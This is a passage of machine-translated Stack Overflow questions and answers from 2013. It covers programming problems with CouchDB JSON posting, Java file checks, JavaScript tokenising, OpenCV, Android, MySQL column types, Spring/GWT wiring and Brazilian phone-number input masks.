`Room: { "_attachments" = { picture = { "content_type" = "text/plain"; data = BASE64; }; }; comment = 12; floor = 12; roomNumber = 12; status = 0; type = room; }`

不知道为什么它会在那里结束，但无论如何，这并不重要。问题是带有“_”或“/”的键最终被“-marks”包围，我接收 JSON 的 Web 端点无法读取它。有谁知道我该如何解决这个问题？我使用 couchdb 并需要 _从附件键中。

编辑：我正在使用它，我将字典传递给 NSJSONSerialization，调用函数 dataWithJSONObject:options:error:。我将从该函数获得的内容存储在 NSData 对象中，并将其设置为我发出的请求中的 http 正文。内容类型是应用程序/json。我还设置了 Content-length 等。这是发出 HTTP 请求的函数。`createDictionary`是上面的函数。

```
// Make a JSON object from the dictionary
NSError *err;
NSData* jsonRoom = [NSJSONSerialization dataWithJSONObject:[room createDictionary]
                                                     options:NSJSONWritingPrettyPrinted
                                                       error:&err];

// Set up the http POST request
NSMutableURLRequest *request = [[NSMutableURLRequest alloc]
                                initWithURL:[NSURL URLWithString:[NSString stringWithFormat:@"%@%@", _baseURL, @"/peters_hotell"]]];
[request setHTTPMethod:@"POST"];
[request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
[request setValue:[NSString stringWithFormat:@"%d", [jsonRoom length]]
                          forHTTPHeaderField:@"Content-length"];
[request setHTTPBody:jsonRoom];

NSLog(@"%@", jsonRoom);
// Fire the http POST request
//[NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:callback];` 
```

现在`sendRequest`调用被注释掉了，但是当我使用它时，服务器无法接受请求。

这是来自 couchdb 的回复：

`Data: { error = badmatch; reason = false; }`

当我将附件部分从字典中删除时，沙发不会抱怨。基本上我要创建的是这个 JSON（内联附件）：[http ://wiki.apache.org/couchdb/HTTP_Document_API#Inline_Attachments](http://wiki.apache.org/couchdb/HTTP_Document_API#Inline_Attachments)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:21:03.483

> 问题是键 [...] 最终被引号包围，而我接收 JSON 的 Web 端点无法读取它。

不，恰恰相反：你认为的 JSON 并不是真正的 JSON。JSON 需要引用键，它使用冒号 ( `:`) 而不是等号等分隔键和值。

您当前打印出的是`NSDictionary`对象的描述，而不是 JSON。它采用传统的 NeXTSTEP 样式的属性列表格式。

您要使用的是`NSJSONSerialization`类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:28:44.340

当您发布 url 和 Json 对象时，在将其发布到服务器之前，使用

> stringByAddingPercentEscapesUsingEncoding

或者

> NSUTF8编码技术..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T13:35:31.117

谢谢您的帮助！它让我找到了答案。事实证明，我的 POST 请求被拒绝，因为我的数据输入不是有效的 base64，所以沙发拒绝了它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T13:49:42.210

代码：

```
@implementation NSString (NSString_Extended)

- (NSString *)urlEncoded
{
    CFStringRef urlString = CFURLCreateStringByAddingPercentEscapes(
                                                                NULL,
                                                                (CFStringRef)self,
                                                                NULL,
                                                                (CFStringRef)@"!*'\"();:@&=+$,/?%#[]% ",
                                                                kCFStringEncodingUTF8 );
    return [(NSString *)urlString autorelease];
}

@end 
```

# java - File.isFile() 和 File.isDirectory() 都返回 false

> ID：14853402
> 
> 赞同：14
> 
> 时间：2013-02-13T12:17:50.420
> 
> 标签：java, file

我有一个名为“aaaaaaa.xls”的文件

为此，`File.isFile()`并且`File.isDirectory()`正在返回`false`？为什么它回来`false`了`Linux`？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-13T12:25:00.387

请尝试以下代码示例

```
if(!pFile.exists()){
   throw new FileNotFoundException();
}

boolean isDir = pFile.isDirectory();

boolean isFile = pfile.isFile(); 
```

该文件不是文件

> 如果它不是目录，并且另外满足其他系统相关标准

如果抛出异常，则必须检查文件路径。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-01-19T23:25:04.163

根据[文档](http://docs.oracle.com/javase/7/docs/api/java/io/File.html#isFile%28%29)：

> 公共布尔 isFile()
> 
> **返回：** 当且仅当此抽象路径名表示的文件*存在*并且是*普通*文件时，才返回 true；否则为假。

在此基础上，您的文件要么不存在，要么不是普通文件。

第一种可能的原因：

1.  文件不存在；
2.  文件无法访问；
3.  文件名输入错误；
4.  程序中使用的字符编码与创建文件时使用的不同。

第2种可能的原因：

*   这不是一个[普通的文件](https://stackoverflow.com/q/6858452/1429387)。

或者这是JVM中的一个错误。这也是可能的，但不太可能。例如，我立刻遇到了路径名中的感叹号问题 -[错误 4523159](http://bugs.sun.com/view_bug.do?bug_id=4523159)。

如果您想以任何方式访问该文件，请考虑调用[`dir.listFiles()`](http://docs.oracle.com/javase/7/docs/api/java/io/File.html#listFiles%28%29)并使用其返回值。

* * *

[（答案部分基于[此线程](http://www.velocityreviews.com/forums/t388123-file-isfile-returns-false-on-special-character-files.html)）]

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-14T09:46:05.967

检查此文件的父目录的权限。其中一些目录可能没有当前用户的**执行**权限。

*   目录的执行位允许受影响的用户进入它并访问其中的文件和目录

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-05-30T15:02:31.807

我知道这个问题是在五年前提出的，事实上，我遇到了同样的问题，我正在创建一个给定路径中所有文件的列表，如下所示：

```
File files = Paths.get(path).toFile();      
List<String> filenames = Arrays.asList(files.list()); 
```

问题是，该*路径*包含一个名为*testing_testing*的目录，该目录作为列表的一部分返回。

然后当我做以下测试时：

```
for (String filename : filenames) {
    if (Files.isDirectory(Paths.get(filename))) {
        System.out.println(filename + " is a directory.");
    } else {
        if(filename.equals("testing_testing")) {
            System.out.println("Is this a directory?: " + Files.isDirectory(Paths.get(filename)));
            System.out.println("Does the file exists?: " + Files.exists(Paths.get(filename)));
            System.out.println("Is this a regular file?: " + Files.isRegularFile(Paths.get(filename)));
            System.out.println("Is this a symbolic link?: " + Files.isSymbolicLink(Paths.get(filename)));                       
        }                   
    }
} 
```

它返回 false for`Files.isDirectory()`和 for `Files.exists()`。

修修补补了一下，我注意到我只获取文件名，没有完整路径，这意味着我只是传递*testing_testing*到`Paths.get()`而不是传递完整路径来获取它，这就是它不存在的原因并在两种情况下都返回 false。

我将代码更改为：

```
Paths.get("C:\test", filename); 
```

现在测试返回正确的值。我不知道你是否已经想通了，因为你问已经五年了。但是对于遇到同样问题的任何人，请确保您将正确的路径传递给您的文件，然后尝试在同一问题的先前答案中建议的其他事情。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-02-03T02:41:09.083

您的情况下Java使用的字符编码与源文件中的字符编码不同，因此文件名中的符号“ä”无法被Java正确解码，导致文件名不同。这就是Java找不到该文件的原因。因此，对该文件的文件操作函数返回“False”。

作为在不同构建环境中正常工作的最安全方法，为避免设置 Java 字符编码选项并更轻松地处理源文件，请在源代码中仅使用 US-ASCII（7 位）字符。至于其他字符，请使用它们的 Unicode 数字，例如，使用“\u00e4”代替“ä”。因此，您的文件名将变为“aaa\u00e4aa.xls”。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-11-27T16:19:12.790

我在`file.isFile()`返回`false`文件时也遇到了问题，大概是因为该文件不是“常规”文件，正如对该问题的其他回复中所述。作为一种解决方法，我使用`file.listFiles() != null`，它似乎提供了我需要的功能。根据[Java 文件 API](https://docs.oracle.com/javase/7/docs/api/java/io/File.html#listFiles())：

> 如果此抽象路径名不表示目录，则此方法返回 null。否则返回一个 File 对象数组。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-04-12T13:37:33.297

我在`.txt`文件上测试 isFile() 时遇到了同样的错误。问题是我创建的文件`something.txt`带有`.txt`名称。然后我重命名`something.txt`为`something`

我真的很生自己的气

# javascript - 如何在 Javascript 中标记字符串？

> ID：14853404
> 
> 赞同：1
> 
> 时间：2013-02-13T12:17:52.243
> 
> 标签：javascript, arrays, string

我有一个字符串：

```
'"Apples" AND "Bananas" OR "Gala Melon"' 
```

我想将其转换为数组

```
arr = ['"Apples"', 'AND', '"Bananas"', 'OR', '"Gala Melon"'] 
```

我不知道我是否可以使用正则表达式来做到这一点。我开始认为我可能必须一次解析每个字符以匹配双引号。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T12:36:45.927

```
input = '"Apples" AND "Bananas" OR "Gala Melon"'

output = input.match(/\w+|"[^"]+"/g)
// output = ['"Apples"', 'AND', '"Bananas"', 'OR', '"Gala Melon"'] 
```

正则表达式的解释：

`/`- 正则表达式
`\w+`的开头 - 单词字符序列
`|` - 或
`"[^"]+"`- 引用的任何内容（假设没有转义引号）
`/g`- 正则表达式的结尾，全局标志（执行多个匹配）

# java - Dropbox API：如何获取剩余可用空间量？

> ID：14853410
> 
> 赞同：1
> 
> 时间：2013-02-13T12:18:14.263
> 
> 标签：java, android, dropbox-api

在我看来，Dropbox API 无法判断链接的 Dropbox 帐户的剩余可用空间。我只能通过使用 .accountInfo() 调用来获取用户的总配额。

我看到的唯一方法是遍历用户存储在 Dropbox 中的所有文件，并总结它们的大小，然后从总配额中减去这个数量。这个解决方案看起来很糟糕而且很慢，有没有更好的方法呢？

作为旁注，我尝试在 Android 上执行此操作，但我不认为这是一个依赖于平台的问题。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-15T16:41:34.807

[/account/info 调用](https://www.dropbox.com/developers/core/api#account-info)状态的文档：

> quota_info/normal 用户在共享文件夹之外使用的配额（字节）。
> 
> quota_info/shared 用户在共享文件夹中使用的配额（字节）。
> 
> quota_info/quota 用户的总配额分配（字节）。

所以，可用空间应该是：

```
quota - normal - shared 
```

# c# - 静态分析不适用于最简单的示例

> ID：14853412
> 
> 赞同：0
> 
> 时间：2013-02-13T12:18:17.977
> 
> 标签：c#, visual-studio-2010, code-contracts

以下是我为使静态分析工具失败而创建的示例：

```
using System.Diagnostics.Contracts;
using System;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            object x = null;
            Contract.Assert(x != null);
        }
    }
} 
```

运行时分析会引发正确的异常，但静态分析会在没有警告的情况下构建。我在项目设置中选中了每个复选框，并在“hi”上设置了警告级别。我正在运行版本 1.4.51019.0。

我需要做什么才能使编译失败？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:23:44.787

“选中的每个复选框”是这里的问题。您需要取消选中“推断确保”。

这里发生的情况如下：
您创建的代码永远不会是正确的，您使用初始化`x`，`null`然后直接断言`x`应该不是`null`。
由于这种矛盾，Code Contracts inferes`Contract.Ensures(false)`总是会失败。
我假设`Contract.Ensures(false)`方法开头的推断将使静态分析器跳过该方法的其余部分。

对我来说，推断`Contract.Ensures(false)`似乎是代码合同的错误，但禁用它的唯一方法是完全禁用确保的推断。

# c++ - Mat::ones 在 OpenCV 中不工作

> ID：14853416
> 
> 赞同：1
> 
> 时间：2013-02-13T12:18:20.577
> 
> 标签：c++, opencv

```
int main () {    

    Mat A = Mat::ones(100, 100, CV_8U)*3;
    cout << A.at<int>(0,0) << endl;

    return 0;
} 
```

输出是一个非常大的数字 :: 50529027

谁能帮我吗？？C++ 代码

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:22:36.197

```
you're casting to the wrong type in A.at<int>() // should be uchar instead of int

so, A.at<int>(0,0) sees 0x03030303, which is, in fact 50529027.

Mat A = Mat::ones(100, 100, CV_8U)*3;
cout << int(A.at<uchar>(0,0)) << endl; 
```

（ A.at() 周围的演员只是用 cout 而不是 char 显示一个数字）

# android - Android中的HotSpot（WiFi接入点）

> ID：14853419
> 
> 赞同：1
> 
> 时间：2013-02-13T12:18:21.930
> 
> 标签：android, wifi, access-point, ssid

有人可以帮我启动“WiFi接入点”活动吗？我可以通过代码打开热点，但无法获取网络名称或启动所需的活动。

我尝试了以下代码：

```
Intent intent = new Intent();
intent.setAction(Intent.ACTION_VIEW);
intent.setClassName("com.android.settings.wifi", "com.android.settings.wifi.WifiApDialog");
cxt.startActivity(intent); 
```

除此之外，我还想获取 HotSpot 用户名和密码。我正在开发的应用程序更类似于 FoxFi。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:21:27.653

据我所知，您对此没有任何公开意图。
但是您可以使用以下意图打开无线和网络>更多...：

```
android.provider.Settings.ACTION_WIRELESS_SETTINGS 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:25:37.317

像这样尝试这对我有用，直接打开你的活动课

```
Activity.this.startActivity(new Intent(Settings.ACTION_WIRELESS_SETTINGS)); 
```

# javascript - 编辑表格设计以响应 Javascript 启用/禁用

> ID：14853420
> 
> 赞同：0
> 
> 时间：2013-02-13T12:18:25.667
> 
> 标签：javascript, html-table

如果我有一个 HTML 表格，其中有三行，每行 4 个单元格，我想根据脚本是否可用来更改第三行中的单元格数。我的主要目标是改变菜单的位置。原因是如果禁用了 Javascript，我希望第二行的第二个单元格填充一个简单的菜单，该菜单没有任何下拉菜单，并且是从上到下运行的老派。如果用户有 Javascript，我希望页面在顶部使用 Javascript 菜单栏，该菜单栏从左到右运行，所有的花里胡哨。第二行的第二个单元格包含页面内容，但如果启用了 Javascript 并且我不需要左侧的老式菜单，那么我希望内容占据第二行单元格以删除菜单应该有的空间走了。

我`<script><noscript>`在创建第二行时尝试使用标签，如下所示：

```
 <Noscript>
        <TR> 
            <TD></TD>
            <TD></TD>
            <TD></TD> 
            <TD></TD>
        </TR>
    </noscript>

    <Script> 
        <TR> 
            <TD></TD>
            <TD colspan=2></TD>
            <TD></TD>  
        </TR>
    </script> 
```

当我禁用 Javascript 时，它给出了预期的结果，但是当我启用 Javascript 时，我得到一个语法错误，可能是因为这不是这样做的方法。整个现有网站都是在一张桌子上完成的，改变布局方法并不是我的第一选择。有没有人有这样做的经验，或者可能有解决方案让它发挥作用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:24:10.650

我不是 100% 确定我明白你在追求什么，但这里......

我建议在两个 TR 上放置一个不同的类（只有在启用 JavaScript 时才应显示的类和默认类），并将仅在启用 JS 时才应显示的类设置为您的 css 中的“显示：无”。

如果启用了 JavaScript，只需将 TR 设置为“display: block”（或静态），另一个（默认）设置为“display: none”。

# android - 未在 Phonegap 应用程序 (Android) 中创建 SQLite 数据库

> ID：14853422
> 
> 赞同：0
> 
> 时间：2013-02-13T12:18:33.107
> 
> 标签：android, sqlite, cordova

当我在 Safari（桌面）或虚拟设备中测试我的应用程序时，我可以看到数据库按预期创建，但是如果我在物理设备（galaxy note 选项卡）上运行相同的应用程序，我可以看到 /data 文件夹为空DDMS 文件资源管理器，我找不到数据库。

我正在尝试在 onDeviceReady 函数中创建数据库，我可以看到它正在按预期触发。

我是否需要对该设备的 root 访问权限？我查了一下，是不是root了？

这是我的 config.xml ：

```
<?xml version="1.0" encoding="UTF-8"?>

<widget xmlns = "http://www.w3.org/ns/widgets"
    xmlns:gap = "http://phonegap.com/ns/1.0"
    id = "uk.co.epwin.ecobuild2013"
    version = "0.0.1"
    versionCode = "1">

<name>Ecobuild 2013</name>

<description>
app for the 2013 Ecobuild exhibition
</description>

<author href="http://www.epwin.co.uk" email="info@epwin.co.uk">
    Mike Mardon | Epwin Group Design Studio
</author>

<!-- ICONS -->
<icon src="images/icons/icon.png" /> <!-- default 72 pixels -->
<icon src="images/icons/ios/icon.png" width="57" height="57" /> <!-- iPhone 3G, iPhone 3GS, iPod Touch 2G, 3G -->
<icon src="images/icons/ios/icon72.png" gap:platform="ios" width="72" height="72" /> <!-- iPad, iPad 2, iPad mini -->
<icon src="images/icons/ios/icon114.png" width="114" height="114" /> <!-- iPhone 4, iPhone 4S, iPod Touch 4G -->
<icon src="images/icons/ios/icon144.png" width="144" height="144" /> <!-- iPad 3, iPad 4 -->
<icon src="images/icons/android/ldpi.png" gap:platform="android" gap:density="ldpi" /> <!-- 36 pixels -->
<icon src="images/icons/android/mdpi.png" gap:platform="android" gap:density="mdpi" /> <!-- 48 pixels -->
<icon src="images/icons/android/hdpi.png" gap:platform="android" gap:density="hdpi" /> <!-- 72 pixels -->
<icon src="images/icons/android/xhdpi.png" gap:platform="android" gap:density="xhdpi" /> <!-- 96 pixels -->
<icon src="images/icons/bb/icon.png" gap:platform="blackberry" /> <!-- 72 pixels -->
<icon src="images/icons/bb/icon_hover.png" gap:platform="blackberry" gap:state="hover"/> <!-- 72 pixels -->
<icon src="images/icons/winphone/icon.png" gap:platform="winphone" /> <!-- 57 pixels -->
<icon src="images/icons/winphone/tileicon.png" gap:platform="winphone" gap:role="background" /> <!-- 72 pixels -->
<icon src="images/icons/webos/icon.png" gap:platform="webos" /> <!-- 29 pixels -->
<icon src="images/icons/webos/miniicon.png" gap:platform="webos" gap:role="mini" /> <!-- 15 pixels -->

<!-- SPLASH SCREENS -->
<gap:splash src="images/splash/splash.png" /> <!-- default 320x480 pixels -->
<gap:splash src="images/splash/ios/1024x768.png" width="1024" height="768" /> <!-- iPad 1, iPad 2, iPad mini -->
<gap:splash src="images/splash/ios/768x1024.png" width="768" height="1024" /> <!-- iPad 1, iPad 2, iPad mini -->
<gap:splash src="images/splash/ios/320x480.png" width="320" height="480" /> <!-- iPh 3G / 3GS, iPod Touch 2, iPod Touch 3 -->
<gap:splash src="images/splash/ios/640x960.png" width="640" height="960" /> <!-- iPhone 4, iPhone 4S, iPod Touch 4 -->
<gap:splash src="images/splash/ios/640x1136.png" width="640" height="1136" /> <!-- iPhone 5, iPod Touch 5 -->
<gap:splash src="images/splash/android/ldpi.png" gap:platform="android" gap:density="ldpi" /> <!-- 200x320 -->
<gap:splash src="images/splash/android/mdpi.png" gap:platform="android" gap:density="mdpi" /> <!-- 320x480 -->
<gap:splash src="images/splash/android/hdpi.png" gap:platform="android" gap:density="hdpi" /> <!-- 480x800 -->
<gap:splash src="images/splash/android/xhdpi.png" gap:platform="android" gap:density="xhdpi" /> <!-- 720x1280 -->
<gap:splash src="images/splash/bb/splash.png" gap:platform="blackberry" /> <!-- BlackBerry 250x250 -->
<gap:splash src="images/splash/winphone/splash.jpg" gap:platform="winphone" /> <!-- Windows Phone 7 480x800 -->
<gap:splash src="images/splash/webos/splash.png" gap:platform="webos" /> <!-- WebOS 64x64 -->

<!-- GENERAL PREFERENCES -->
<!--<preference name="phonegap-version" value="2.2.0" /> if unspecified it will build with latest version--> 
<preference name="orientation" value="landscape" /> 
<preference name="target-device" value="universal" /> <!-- handset, tablet only applies to ios, other are universal -->
<preference name="fullscreen" value="true" /> 

<!-- iOS PREFERENCES -->
<preference name="webviewbounce" value="false" /> <!-- if screen "bounces" when scrolled beyond top or bottom on iOS -->
<preference name="prerendered-icon" value="true" />  <!-- if true, iOS won't apply its gloss to app's home screen icon -->
<preference name="stay-in-webview" value="false" /> <!-- if true, all links (even with target blank) will open in webview -->
<preference name="ios-statusbarstyle" value="black-opaque" />
<preference name="exit-on-suspend" value="true" /> <!-- if set to false, app will continue to run on suspend -->
<preference name="show-splash-screen-spinner" value="true" /> <!-- show spinner on the splash screen during app loading -->
<preference name="auto-hide-splash-screen" value="true" /> <!-- if false, it must be hidden using a JavaScript API -->

<!-- ANDROID PREFERENCES -->
<preference name="android-minSdkVersion" value="7" /> <!-- min Android 2.1 -->
<!-- <preference name="android-maxSdkVersion" value="17" /> max Android 4.2 -->
<preference name="android-installLocation" value="auto" /> <!-- internalOnly, auto or preferExternal -->
<preference name="splash-screen-duration" value="5000" /> <!-- 5 seconds  - for auto-hide behaviour call    navigator.splashscreen.hide(); in the device-ready method-->        
<preference name="load-url-timeout" value="20000" /> <!-- 20 seconds -->
<plugin name="Storage" value="org.apache.cordova.Storage" />

<!-- BLACKBERRY PREFERENCES -->
<preference name="disable-cursor" value="false" />

<!-- PHONEGAP API FEATURES PREFERENCES -->
<preference name="permissions" value="none"/>

<!-- If you do not want any permissions to be added to your app, add the
following tag to your config.xml; you will still have the INTERNET
permission on your app, which PhoneGap requires.
<preference name="permissions" value="none"/> -->

<!-- to enable individual permissions use the following examples -->
<!--<feature name="http://api.phonegap.com/1.0/battery"/>-->
<!--<feature name="http://api.phonegap.com/1.0/camera"/>-->
<!--<feature name="http://api.phonegap.com/1.0/contacts"/>-->
<feature name="http://api.phonegap.com/1.0/file"/>
<!--<feature name="http://api.phonegap.com/1.0/geolocation"/>-->
<!--<feature name="http://api.phonegap.com/1.0/media"/>-->
<!--<feature name="http://api.phonegap.com/1.0/network"/>-->
<!--<feature name="http://api.phonegap.com/1.0/notification"/>--> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:53:43.367

您确实需要一个根设备来展开文件资源管理器`data`上的文件夹。它看起来是空的，但事实并非如此。

如果它适用于您的 avd，它也应该适用于您的设备，您只是无法访问文件资源管理器上的数据库文件。

# mysql - 在 MySQL 数据库设计方面需要帮助（最小化开销）

> ID：14853424
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:18:35.243
> 
> 标签：mysql, database-design

我正在尝试设计一个 mysql 数据库，但不知道如何将开销降至最低，我有 uniq 需求。其中一个字段可能长达 60kb 或短至 100 字节，我应该在该字段中使用哪种类型和长度以将开销降至最低？

我听说如果您将最大值定义为 60k，那么行中剩余的每个未使用空间直到 60k 都将被空间填充，您知道这可能会导致不必要的开销，只有少数原始数据会使用这个长度，而大多数其余行不会，你有什么建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T19:12:10.767

在 MySQL 中，`VARCHAR`紧凑地存储**在磁盘上**，即它只存储给定行上使用的字符串，加上一两个字节来编码该字符串的长度。数据和索引都是如此。

但是一旦`VARCHAR`从存储引擎加载到内存中，它就会被填充到全长。如果您声明，这会不必要地消耗大量内存`VARCHAR(65535)`。然后，在排序或临时表操作期间，该填充表示可能最终在磁盘上。

所以使用`TEXT`. 这种数据类型不会像`VARCHAR`这样在内存中填充，它还支持高达 64KB 的字符串。

如果您需要更长的字符串，请使用`MEDIUMTEXT`最大支持 16MB 的字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:23:30.763

使用[VARCHAR](http://dev.mysql.com/doc/refman/5.0/en/char.html)。

> VARCHAR 列中的值是可变长度字符串。在 MySQL 5.0.3 之前，长度可以指定为 0 到 255 之间的值，在 5.0.3 和更高版本中可以指定为 0 到 65,535 之间的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T19:01:25.683

> 其中一个字段可能长达 60kb 或短至 100 字节

听起来像[BLOB/TEXT](http://dev.mysql.com/doc/refman/5.6/en/blob.html)。正如[Andreas 所指出的](https://stackoverflow.com/a/14853502/533120)，如果您确定不需要超过 64K，您甚至可以使用 VARCHAR。

> 我听说如果您将最大值定义为 60k，那么行中剩余的每个未使用的空间直到 60k 都将被空间填充

**如果**您使用 CHAR，则可以：它存储填充。

> 只有少数行会使用此长度，而其余大多数行不会

这是不正确的。现代 DBMS 存储可变长度的行：只有实际需要的空间才会被实际使用。只需使用 BLOB/TEXT 或 VARCHAR 就可以了。

# opencv - 如何创建自己的 setSVMDetector？

> ID：14853425
> 
> 赞同：1
> 
> 时间：2013-02-13T12:18:35.520
> 
> 标签：opencv, object-detection

当我创建 statndart 检测器时...

```
static vector<float> detector = HOGDescriptor::getDefaultPeopleDetector();
if (!detector.size()) {
    fprintf(stderr, "ERROR: getDefaultPeopleDetector returned NULL\n");
    return -1;      
}
hog.setSVMDetector(detector);
hog.detectMultiScale(img, rects); 
```

...一切正常。

但！

当我使用“OpenCV 分类器工具”（classifieropencv.codeplex.com）创建自己的分类器时，我找不到对象。我使用所有默认参数：winSize、blockSize、blockStride、cellSize 等。为什么？有人用这个工具来创建分类器来进行 HOG 检测吗？任何人使用 HOGDescriptor 来检测他自己的对象（没有 getDefaultPeopleDetector ）？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-29T20:18:42.717

这个工具很有用：“OpenCV 的分类器工具”（classifieropencv.codeplex.com）

此工具中的参数（当您创建分类器时）必须与您的 OpenCv 代码中的参数（当您使用分类器时）相同。

[这是俄语手册](http://iskees.wordpress.com/2013/02/13/%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-svm-hog-%D0%B4%D0%BB%D1%8F-%D0%BF%D0%BE%D0%B8%D1%81%D0%BA%D0%B0-%D0%BA%D1%80%D1%83/)，但有很多图片和视频，而且很清楚。

# spring - 带有spring autowired的RemoteServiceServlet给出了nullpointerexception

> ID：14853428
> 
> 赞同：2
> 
> 时间：2013-02-13T12:18:45.053
> 
> 标签：spring, gwt, aspectj, spring-aop

我在 Spring 中使用 GWT。我遇到了`@Autowired`在`RemoteServiceServlet`. 出于某种原因，这不会自动工作，我需要使用它`@Configurable`来让它工作。我遵循[了这种方法](http://blog.maxmatveev.com/2011/05/spring-beans-and-annotations-in-servlet.html)，但我仍然得到了`NullPointerException`bean `@Autowired`：

```
@Configurable
@Transactional(propagation = Propagation.REQUIRED, readOnly = false)
public class AServiceImpl extends RemoteServiceServlet implements AService {

    @Autowired
    private IABean aBean;

    @Override
    public void aMethodFromAService(Args arg[]) {
        aBean.aMethodOfABean(); // this gives a NullPointerException
    }
}

@Component
public class ABean implements IABean {
    ...
} 
```

关于发生了什么的任何指导？我需要提供任何额外的信息吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:54:06.613

[http://mitosome.blogspot.be/2011/01/injecting-spring-beans-into-gwt.html](http://mitosome.blogspot.be/2011/01/injecting-spring-beans-into-gwt.html)

感谢亚历山大让我朝着正确的方向前进

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T14:01:33.723

您找到了一个可行的解决方案，但仅供记录，我们的工作方式如下：

```
public class MyServiceImpl extends RemoteServiceServlet 
                           implements MyService, ServletContextAware
{
    @Autowired private transient SomeService someService;
    ....
} 
```

和

```
<context:annotation-config/>
<context:component-scan base-package="..."/> 
```

这`SomeService`是一个完全普通的 XML 定义的 bean。也许那或`...implements ServletContextAware`有所作为。

干杯，

# javascript - 巴西电话号码的 JavaScript 掩码

> ID：14853453
> 
> 赞同：1
> 
> 时间：2013-02-13T12:20:31.557
> 
> 标签：javascript, jquery, validation, maskedinput

目前我正在将 jquery.maskedinput 用于各种掩码格式，但它不适用于电话号码。

在巴西，我们曾经使用 (99)9999-9999 格式的所有数字。但最近，在少数城市，手机使用（99）99999-9999，而他们的普通手机和全国其他地区仍然使用（99）9999-9999。

jquery.maskedinput 似乎不支持同一输入上的 2 种格式，其中字符串中间的字符可能存在也可能不存在。正如我在其文档中看到的那样，我可以拥有 (99)9999-9999 和 (99)9999-99999，但这会使用户感到困惑。

是否有任何其他掩码插件/框架允许我同时验证 (99)9999-9999 和 (99)99999-9999？

编辑：我使用 harry 和 Dmitrii 解决方案创建了一个完整的测试：http: [//jsfiddle.net/NSd6g/](http://jsfiddle.net/NSd6g/) `$('#full').inputmask('(99)9999[9]-9999');`

我会再等一会儿，看看我是否能找到更好的解决方案。完美的不需要红色消息，第二组默认为 4 位。并且，如果第三组将获得第五个数字，那么只有第二组将获得其第五个空格，将第三组的第一个数字移动到第二组的第五个数字。大声笑有点难以理解，对不起！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-18T15:01:04.220

[您可以使用jquery.inputmask](https://github.com/RobinHerbots/jquery.inputmask)来实现这一点，如下所示：

```
jQuery(function($) {
    $('#test').inputmask('(99)9999[9]-9999');
}); 
```

试试这个[演示](http://jsfiddle.net/DAAJk/)。

要在输入时跳过可选部分，您需要在掩码中的可选部分后面输入空格或字符（在这种情况下为连字符）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-18T14:54:18.150

我也是巴西人。

在我的工作中，我们实际上并没有在中间使用“-”字符来表示这些类型的掩码，所以没有混淆......最终的掩码如下：`(99)99999999?9`

最终用户以这种方式识别错误输入的电话号码有点困难，但它确实有效。

我知道的另一种方法是在 JS 中构建正则表达式，然后将它与另一个插件一起使用，例如[jQuery Validate](https://github.com/jzaefferer/jquery-validation/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-18T14:53:49.997

使用 jQuery 掩码，您只能让尾随字符是可选的。不是输入中间的那些。

我的建议是有 3 个输入框，一个用于数字的每个部分，中间输入末尾带有可选字符。然后在提交时连接输入。

像这样：

```
 (<input id="phone2" />)<input id="phone3" />-<input id="phone4" />

jQuery(function($){
  $("#phone2").mask("99");
  $("#phone3").mask("9999?9");
  $("#phone4").mask("9999");
}); 
```

见小提琴：http: [//jsfiddle.net/Rge83/1/](http://jsfiddle.net/Rge83/1/)

为了使其更加用户友好，可以添加一个脚本以在当前输入已填充后移至下一个输入+一些 css 以使输入看起来更像一个。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-06-03T19:22:39.697

我的建议：“(99) [9] 9999-9999”

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-25T17:34:00.717

```
//Configuração para celular com nono digito
$('#Seletor').focusout(function () {
    var phone, element;
    element = $(this);
    element.unmask();
    phone = element.val().replace(/\D/g, '');
    if (phone.length > 10) {
        element.mask("(99) 99999-999?9");
    } else {
        element.mask("(99) 9999-9999?9");
    }
}).trigger('focusout'); 
```

# iphone - 为 iOS 创建自定义 UIController 分步教程

> ID：14853454
> 
> 赞同：2
> 
> 时间：2013-02-13T12:20:35.060
> 
> 标签：iphone, ios, user-interface

我在各个站点，特别是在[http://www.cocoacontrols.com/](http://www.cocoacontrols.com/)中发现了很多自定义可可控件，这真的很有帮助。任何人都可以使用这些。但我想知道有没有一步一步的教程来制作我自己的自定义 UI 控制器？您可以发布一些参考吗？

* * *

## 回答 #1

> 赞同：2
> 
